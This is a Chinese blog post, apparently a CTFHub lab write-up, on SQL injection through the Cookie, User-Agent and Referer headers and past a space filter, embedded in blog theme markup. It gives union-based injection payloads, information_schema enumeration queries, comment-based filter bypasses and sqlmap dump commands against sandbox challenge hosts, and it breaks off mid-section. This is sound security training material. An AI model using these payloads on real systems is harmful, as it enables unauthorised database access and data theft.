@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"defalut"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Cookie注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入（2）">
+<meta property="og:url" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/index.html">
+<meta property="og:site_name" content="Crrrln">
+<meta property="og:description" content="Cookie注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/cookie%E6%8F%90%E7%A4%BA.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/URL%E8%A7%A3%E7%A0%81.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/cookie%E8%BE%93%E5%85%A51.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E6%9F%A5%E7%9C%8B%E5%88%97%E6%95%B0.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E5%BA%93%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E8%A1%A8%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E5%88%97%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/flag.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqlmap%E5%BA%93%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqlmap%E8%A1%A8%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqlmap%E5%88%97%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqlmap_flag.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/UA%E6%B3%A8%E5%85%A5.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/UA-%E5%87%A0%E5%88%97.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/UA-%E5%BA%93%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/UA-%E8%A1%A8%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/UA-%E5%88%97%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/UA-flag.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqlmap-%E5%BA%93.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqlmap-UA-%E8%A1%A8.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqlmap-UA-%E5%88%97.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqlmap-UA-flag.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/refer-1.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/referer-%E5%87%A0%E5%88%97.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/referer-%E5%BA%93%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/referer-%E8%A1%A8%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/referer-%E5%88%97%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/referer-flag.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/referer-post.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/referertxt.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqlmap-referer-%E5%BA%93%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqlmap-referer-%E8%A1%A8.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqlmap-referer-%E5%88%97.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/sqkmap-referer-flag.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E7%A9%BA%E6%A0%BC-1.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/hacker.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E7%A9%BA%E6%A0%BC-%E5%BA%93%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E7%A9%BA%E6%A0%BC-%E8%A1%A8%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E7%A9%BA%E6%A0%BC-%E5%88%97%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E7%A9%BA%E6%A0%BC-flag.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E7%A9%BA%E6%A0%BC-sqlmap-%E5%BA%93%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E7%A9%BA%E6%A0%BC-sqlmap-%E8%A1%A8%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E7%A9%BA%E6%A0%BC-sqlmap-%E5%88%97%E5%90%8D.png">
+<meta property="og:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/%E7%A9%BA%E6%A0%BC-sqlmap-flag.png">
+<meta property="article:published_time" content="2024-01-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-28T13:02:15.869Z">
+<meta property="article:author" content="Crrrln">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="UA注入">
+<meta property="article:tag" content="Refer注入">
+<meta property="article:tag" content="过滤空格">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/cookie%E6%8F%90%E7%A4%BA.png">
+
+
+<link rel="canonical" href="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/","path":"2024/01/24/CTFHUB-WEB-sql注入（2）/","title":"SQL注入（2）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入（2） | Crrrln</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Crrrln</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">Cookie注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 前置知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-wp"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 wp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UA%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">UA注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 前置知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-wp-1"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 wp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Refer%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">Refer注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2"><span class="nav-number">3.1.</span> <span class="nav-text">0x01 前置知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-wp-2"><span class="nav-number">3.2.</span> <span class="nav-text">0x02 wp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-number">4.</span> <span class="nav-text">过滤空格</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-3"><span class="nav-number">4.1.</span> <span class="nav-text">0x01 前置知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-wp-3"><span class="nav-number">4.2.</span> <span class="nav-text">0x02 wp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number"></span> <span class="nav-text">参考</span></a></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Crrrln</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/01/24/CTFHUB-WEB-sql%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Crrrln">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Crrrln">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入（2） | Crrrln">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入（2）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-01-24 00:00:00" itemprop="dateCreated datePublished" datetime="2024-01-24T00:00:00+08:00">2024-01-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-01-28 21:02:15" itemprop="dateModified" datetime="2024-01-28T21:02:15+08:00">2024-01-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctfhub/" itemprop="url" rel="index"><span itemprop="name">ctfhub</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.7k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><h4 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h4><p>cookie注入</p>
+<ul>
+<li>与传统的SQL注入相比，注入的位置不同，注入参数换成了cookie</li>
+</ul>
+<p>cookie注入形成的条件</p>
+<ul>
+<li>程序对get和post方式提交的数据进行了过滤，但未对cookie提交的<a target="_blank" rel="noopener" href="https://cloud.tencent.com/solution/database?from_column=20065&from=20065">数据库</a>进行过滤</li>
+<li>程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是在URL后面的参数也可以是cookie里面的参数这里没有做筛选</li>
+</ul>
+<h4 id="0x02-wp"><a href="#0x02-wp" class="headerlink" title="0x02 wp"></a>0x02 wp</h4><p><strong>方法一：手工</strong></p>
+<p>抓包得到提示</p>
+<p><img src="cookie%E6%8F%90%E7%A4%BA.png"></p>
+<p>使用URL解码</p>
+<p><img src="URL%E8%A7%A3%E7%A0%81.png"></p>
+<p>按照提示在cookie处输入1</p>
+<p><img src="cookie%E8%BE%93%E5%85%A51.png"></p>
+<p>发现直接显示了sql语句</p>
+<p>查看有几列数据，输入order by 1，order by 2，order by 3依次尝试，在order by 3的时候没有回显了，则判断共有两列</p>
+<p><img src="%E6%9F%A5%E7%9C%8B%E5%88%97%E6%95%B0.png"></p>
+<p>查看数据库名</p>
+<p><code>-1  union select database(), 2#</code></p>
+<p><img src="%E5%BA%93%E5%90%8D.png"></p>
+<p>sqli即为数据库名</p>
+<p>查看表名</p>
+<p><code>-1 union select group_concat(table_name), 1 from information_schema.tables where table_schema=&#39;sqli&#39;</code></p>
+<p><img src="%E8%A1%A8%E5%90%8D.png"></p>
+<p>查看列名</p>
+<p><code>-1 union select group_concat(column_name), 1 from information_schema.columns where table_name=&#39;iztnxcxbyv&#39;</code></p>
+<p><img src="%E5%88%97%E5%90%8D.png"></p>
+<p>查看数据</p>
+<p><code>-1 union select 1, edptumvhyr from sqli.iztnxcxbyv</code></p>
+<p><img src="flag.png"></p>
+<p>得到flag</p>
+<p><strong>方法二：sqlmap</strong></p>
+<p>直接sqlmap显示没有注入点，需要前序操作知道是cookie注入且可以在id处注入</p>
+<p>查看数据库名</p>
+<p><code>sqlmap -u http://challenge-5d99f95b1f4f1c78.sandbox.ctfhub.com:10800/ --cookie &quot;id=1&quot; --level 2 --dbs</code></p>
+<p><img src="sqlmap%E5%BA%93%E5%90%8D.png"></p>
+<p>查看sqli数据库的表名</p>
+<p><code>sqlmap -u http://challenge-5d99f95b1f4f1c78.sandbox.ctfhub.com:10800/ --cookie &quot;id=1&quot; --level 2 -D sqli --tables</code></p>
+<p><img src="sqlmap%E8%A1%A8%E5%90%8D.png"></p>
+<p>查看列名</p>
+<p><code>sqlmap -u http://challenge-5d99f95b1f4f1c78.sandbox.ctfhub.com:10800/ --cookie &quot;id=1&quot; --level 2 -D sqli -T iztnxcxbyv --columns</code></p>
+<p><img src="sqlmap%E5%88%97%E5%90%8D.png"></p>
+<p>查看flag数值</p>
+<p><code>sqlmap -u http://challenge-11c9544e2023eb65.sandbox.ctfhub.com:10800/?id=1 --dump -C flag -T flag -D sqli</code></p>
+<p><img src="sqlmap_flag.png"></p>
+<h3 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h3><h4 id="0x01-前置知识-1"><a href="#0x01-前置知识-1" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h4><ul>
+<li><p>sqlmap参数 –level</p>
+<p>在sqlmap中一共有五个探测等级，默认等级为一。</p>
+<p>等级为一时会测试get和post的数据。</p>
+<p>等级为二时会测试HTTP头的cookie注入。</p>
+<p>等级为三时会测试HTTP的user-agent、referer头、xff头等的注入。</p>
+<p>等级越高，检测的越多，运行也越慢，所以我们要看情况来选定等级。</p>
+</li>
+</ul>
+<h4 id="0x02-wp-1"><a href="#0x02-wp-1" class="headerlink" title="0x02 wp"></a>0x02 wp</h4><p><strong>方法一：手工</strong></p>
+<p>页面提示输入点在User-Agent部分</p>
+<p><img src="UA%E6%B3%A8%E5%85%A5.png"></p>
+<p>发现了sql语句，和整数型注入的操作一样，查看有几列，发现测试到3的时候没有回显，语句为<code>1 order by 3 </code>，则表明有两列</p>
+<p><img src="UA-%E5%87%A0%E5%88%97.png"></p>
+<p>接下来就是爆库名、爆表名、爆列名</p>
+<p>查看数据库名<code>-1 union select database(), 2#</code></p>
+<p><img src="UA-%E5%BA%93%E5%90%8D.png"></p>
+<p>查看表名</p>
+<p><code>-1 union select group_concat(table_name), 1 from information_schema.tables where table_schema=&#39;sqli&#39;</code></p>
+<p><img src="UA-%E8%A1%A8%E5%90%8D.png"></p>
+<p>查看列名</p>
+<p><code>-1 union select group_concat(column_name), 1 from information_schema.columns where table_name=&#39;tarhtxygvs&#39;</code></p>
+<p><img src="UA-%E5%88%97%E5%90%8D.png"></p>
+<p>查看具体数据</p>
+<p><code>-1 union select 1, muakolktmi from sqli.tarhtxygvs</code></p>
+<p><img src="UA-flag.png"></p>
+<p><strong>方法二：sqlmap</strong></p>
+<p>UA注入 要使用level 3</p>
+<p>查看数据库名</p>
+<p><code>sqlmap -u http://challenge-c8c012e89f49fd7f.sandbox.ctfhub.com:10800 --level 3 --dbs</code></p>
+<p><img src="sqlmap-%E5%BA%93.png"></p>
+<p>查看sqli数据库的表名</p>
+<p><code>sqlmap -u http://challenge-c8c012e89f49fd7f.sandbox.ctfhub.com:10800 --level 3 -D sqli --tables</code></p>
+<p><img src="sqlmap-UA-%E8%A1%A8.png"></p>
+<p>查看列名</p>
+<p><code>sqlmap -u http://challenge-c8c012e89f49fd7f.sandbox.ctfhub.com:10800 --level 3 -D sqli -T iztnxcxbyv --columns</code></p>
+<p><img src="sqlmap-UA-%E5%88%97.png"></p>
+<p>查看flag数值</p>
+<p><code>sqlmap -u http://challenge-c8c012e89f49fd7f.sandbox.ctfhub.com:10800 --level 3 -D sqli  -T iztnxcxbyv -C muakolktmi --dump</code></p>
+<p><img src="sqlmap-UA-flag.png"></p>
+<h3 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h3><h4 id="0x01-前置知识-2"><a href="#0x01-前置知识-2" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h4><ul>
+<li>HTTP Referer是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=header&spm=1001.2101.3001.7020">header</a>的一部分，当浏览器向 web 服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</li>
+</ul>
+<h4 id="0x02-wp-2"><a href="#0x02-wp-2" class="headerlink" title="0x02 wp"></a>0x02 wp</h4><p><strong>方法一：手工</strong></p>
+<p>页面提示：请在referer输入ID部分，试着增加一个字段Referer，并输入1试一试</p>
+<p><img src="refer-1.png"></p>
+<p>发现了sql语句，和整数型注入的操作一样，查看有几列，发现测试到3的时候没有回显，语句为<code>1 order by 3 </code>，则表明有两列</p>
+<p><img src="referer-%E5%87%A0%E5%88%97.png"></p>
+<p>接下来就是爆库名、爆表名、爆列名</p>
+<p>查看数据库名</p>
+<p><code>-1 union select database(), 2</code></p>
+<p><img src="referer-%E5%BA%93%E5%90%8D.png"></p>
+<p>查看表名</p>
+<p><code>-1 union select group_concat(table_name), 1 from information_schema.tables where table_schema=&#39;sqli&#39;</code></p>
+<p><img src="referer-%E8%A1%A8%E5%90%8D.png"></p>
+<p>查看列名</p>
+<p><code>-1 union select group_concat(column_name), 1 from information_schema.columns where table_name=&#39;hmdytwjage&#39;</code></p>
+<p><img src="referer-%E5%88%97%E5%90%8D.png"></p>
+<p>查看具体数据</p>
+<p><code>-1 union select 1, kdcxkjunsl from sqli.hmdytwjage</code></p>
+<p><img src="referer-flag.png"></p>
+<p><strong>方法二：sqlmap</strong></p>
+<p>使用hackbar对数据进行post</p>
+<p><img src="referer-post.png"></p>
+<p>使用burp抓包</p>
+<p><img src="referertxt.png"></p>
+<p>查看数据库名</p>
+<p><code>sqlmap -r referer.txt --referer http://challenge-521e71de9aa8a79d.sandbox.ctfhub.com:10800 --level 3 --dbs</code></p>
+<p><img src="sqlmap-referer-%E5%BA%93%E5%90%8D.png"></p>
+<p>查看sqli数据库的表名</p>
+<p><code>sqlmap -r referer.txt --referer http://challenge-521e71de9aa8a79d.sandbox.ctfhub.com:10800 --level 3 -D sqli --tables</code></p>
+<p><img src="sqlmap-referer-%E8%A1%A8.png"></p>
+<p>查看列名</p>
+<p><code>sqlmap -r referer.txt --referer http://challenge-521e71de9aa8a79d.sandbox.ctfhub.com:10800 --level 3 -D sqli -T iztnxcxbyv --columns</code></p>
+<p><img src="sqlmap-referer-%E5%88%97.png"></p>
+<p>查看flag</p>
+<p><code>sqlmap -r referer.txt --referer http://challenge-521e71de9aa8a79d.sandbox.ctfhub.com:10800 --level 3 -D sqli -T hmdytwjage -C kdcxkjunsl --dump</code></p>
+<p><img src="sqkmap-referer-flag.png"></p>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><h4 id="0x01-前置知识-3"><a href="#0x01-前置知识-3" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h4><p>过滤空格，最基本的绕过方法，用注释替换空格，还有%a0&#x3D;空格</p>
+<p>sqlmap使用–tamper参数对数据做修改来绕过waf等设备</p>
+<ul>
+<li>space2comment：空格替换为&#x2F;**&#x2F;</li>
+</ul>
+<h4 id="0x02-wp-3"><a href="#0x02-wp-3" class="headerlink" title="0x02 wp"></a>0x02 wp</h4><p><strong>方法一：手工</strong></p>
+<p>首先输入1</p>
+<p><img src="%E7%A9%BA%E6%A0%BC-1.png"></p>
+<p>查看有几列，输入<code>1 order by 3 </code>发现空格被过滤</p>
+<p><img src="hacker.png"></p>
+<p>输入<code>1/**/order/**/by/**/2</code>有结果，<code>1/**/order/**/by/**/3</code>无结果，共有两列</p>
+<p>查看数据库名</p>
+<p><code>-1/**/union/**/select/**/database(),2</code></p>
+<p><img src="%E7%A9%BA%E6%A0%BC-%E5%BA%93%E5%90%8D.png"></p>
